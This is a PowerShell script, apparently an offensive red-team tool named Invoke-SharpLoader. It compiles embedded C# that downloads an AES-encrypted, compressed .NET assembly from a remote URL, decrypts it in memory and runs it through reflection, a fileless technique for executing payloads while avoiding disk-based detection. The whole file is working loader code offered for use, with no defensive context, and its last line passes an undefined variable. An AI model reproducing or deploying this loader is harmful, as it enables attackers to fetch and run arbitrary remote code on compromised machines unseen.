function Invoke-SharpLoader
{
<#
    .DESCRIPTION
        Loads AES Encrypted compressed CSharp Files from a remote Webserver.
        Credits to Cn33liz for https://github.com/Cn33liz/p0wnedLoader
        Author: @S3cur3Th1sSh1t
    #>

Param
    (
        [Parameter(Mandatory=$true)]
        [string]
        $url,
        [Parameter(Mandatory=$true)]
	    [string]
        $password,
        [string]
        $argument
	)

$sharploader = @"
using System;
using System.Net;
using System.Text;
using System.IO;
using System.Linq;
using System.Reflection;
using System.Security.Cryptography;
using System.IO.Compression;

namespace SharpLoader
{
    
    public class Program
    {
        public static void PrintBanner()
        {
            Console.WriteLine(@"                                                           ");
            Console.WriteLine(@"    ______                 __                __            ");
            Console.WriteLine(@"   / __/ /  ___ ________  / /  ___  ___ ____/ /__ ____     ");
            Console.WriteLine(@"  _\ \/ _ \/ _ `/ __/ _ \/ /__/ _ \/ _ `/ _  / -_) __/     ");
            Console.WriteLine(@" /___/_//_/\_,_/_/ / .__/____/\___/\_,_/\_,_/\__/_/        ");
            Console.WriteLine(@"                  /_/                                      ");        
            Console.WriteLine(@"                                                           ");
            Console.WriteLine(@"             Loads an AES Encrypted CSharp File            ");
            Console.WriteLine(@"                        from disk or URL                   ");
            Console.WriteLine();
        }

        public static string Get_Stage2(string url)
        {
            try
            {
                HttpWebRequest myWebRequest = (HttpWebRequest)WebRequest.Create(url);
                IWebProxy webProxy = myWebRequest.Proxy;
                if (webProxy != null)
                {
                    webProxy.Credentials = CredentialCache.DefaultNetworkCredentials;
                    myWebRequest.Proxy = webProxy;
                }

                HttpWebResponse response = (HttpWebResponse)myWebRequest.GetResponse();
                Stream data = response.GetResponseStream();
                string html = String.Empty;
                using (StreamReader sr = new StreamReader(data))
                {
                    html = sr.ReadToEnd();
                }
                return html;
            }
            catch (Exception)
            {
                Console.ForegroundColor = ConsoleColor.Red;
                Console.WriteLine();
                Console.WriteLine("\n[!] Whoops, there was a issue with the url...");
                Console.ResetColor();
                return null;
            }
        }

        public static byte[] AES_Decrypt(byte[] bytesToBeDecrypted, byte[] passwordBytes)
        {
            byte[] decryptedBytes = null;


            byte[] saltBytes = new byte[] { 1, 2, 3, 4, 5, 6, 7, 8 };

            using (MemoryStream ms = new MemoryStream())
            {
                using (RijndaelManaged AES = new RijndaelManaged())
                {
                    try
                    {
                        AES.KeySize = 256;
                        AES.BlockSize = 128;

                        var key = new Rfc2898DeriveBytes(passwordBytes, saltBytes, 1000);
                        AES.Key = key.GetBytes(AES.KeySize / 8);
                        AES.IV = key.GetBytes(AES.BlockSize / 8);

                        AES.Mode = CipherMode.CBC;

                        using (var cs = new CryptoStream(ms, AES.CreateDecryptor(), CryptoStreamMode.Write))
                        {
                            cs.Write(bytesToBeDecrypted, 0, bytesToBeDecrypted.Length);
                            cs.Close();
                        }
                        decryptedBytes = ms.ToArray();
                    }
                    catch
                    {
                        Console.ForegroundColor = ConsoleColor.Red;
                        Console.WriteLine("[!] Whoops, something went wrong... Probably a wrong Password.");
                        Console.ResetColor();
                    }
                }
            }

            return decryptedBytes;
        }

        public byte[] GetRandomBytes()
        {
            int _saltSize = 4;
            byte[] ba = new byte[_saltSize];
            RNGCryptoServiceProvider.Create().GetBytes(ba);
            return ba;
        }

        public static byte[] Decompress(byte[] data)
        {
            using (var compressedStream = new MemoryStream(data))
            using (var zipStream = new GZipStream(compressedStream, CompressionMode.Decompress))
            using (var resultStream = new MemoryStream())
            {
                var buffer = new byte[32768];
                int read;

                while ((read = zipStream.Read(buffer, 0, buffer.Length)) > 0)
                {
                    resultStream.Write(buffer, 0, read);
                }

                return resultStream.ToArray();
            }
        }

        public static byte[] Base64_Decode(string encodedData)
        {
            byte[] encodedDataAsBytes = Convert.FromBase64String(encodedData);
            return encodedDataAsBytes;
        }

        public static string ReadPassword()
        {
            string password = "";
            ConsoleKeyInfo info = Console.ReadKey(true);
            while (info.Key != ConsoleKey.Enter)
            {
                if (info.Key != ConsoleKey.Backspace)
                {
                    Console.Write("*");
                    password += info.KeyChar;
                }
                else if (info.Key == ConsoleKey.Backspace)
                {
                    if (!string.IsNullOrEmpty(password))
                    {
                        password = password.Substring(0, password.Length - 1);
                        int pos = Console.CursorLeft;
                        Console.SetCursorPosition(pos - 1, Console.CursorTop);
                        Console.Write(" ");
                        Console.SetCursorPosition(pos - 1, Console.CursorTop);
                    }
                }
                info = Console.ReadKey(true);
            }
            Console.WriteLine();
            return password;
        }

        public static void loadAssembly(byte[] bin, object[] commands)
        {
            Assembly a = Assembly.Load(bin);
            try
            {
                a.EntryPoint.Invoke(null, new object[] { commands });
            }
            catch
            {
                MethodInfo method = a.EntryPoint;
                if (method != null)
                {
                    object o = a.CreateInstance(method.Name);
                    method.Invoke(o, null);
                }
            }            
        }

        public static void Main(params string[] args)
        {
            PrintBanner();
            if (args.Length != 2)
            {
                Console.WriteLine("Parameters missing");
            }
            string URL = args[0];
            Console.Write("[*] One moment while getting our file from URL.... ");
            string Stage2 = Get_Stage2(URL);
            Console.WriteLine("-> Done");
            Console.WriteLine();

            Console.Write("[*] Decrypting file in memory... > ");
            string Password = args[1];
            Console.WriteLine();

            byte[] decoded = Base64_Decode(Stage2);
            byte[] decompressed = Decompress(decoded);

            byte[] passwordBytes = Encoding.UTF8.GetBytes(Password);
            passwordBytes = SHA256.Create().ComputeHash(passwordBytes);

            byte[] bytesDecrypted = AES_Decrypt(decompressed, passwordBytes);

            int _saltSize = 4;

            byte[] originalBytes = new byte[bytesDecrypted.Length - _saltSize];
            for (int i = _saltSize; i < bytesDecrypted.Length; i++)
            {
                originalBytes[i - _saltSize] = bytesDecrypted[i];
            }
            object[] cmd = args.Skip(2).ToArray();
            loadAssembly(originalBytes,cmd);

        }
    }
}
"@

Add-Type -TypeDefinition $sharploader

[SharpLoader.Program]::Main("$url","$password","$outfile")

}
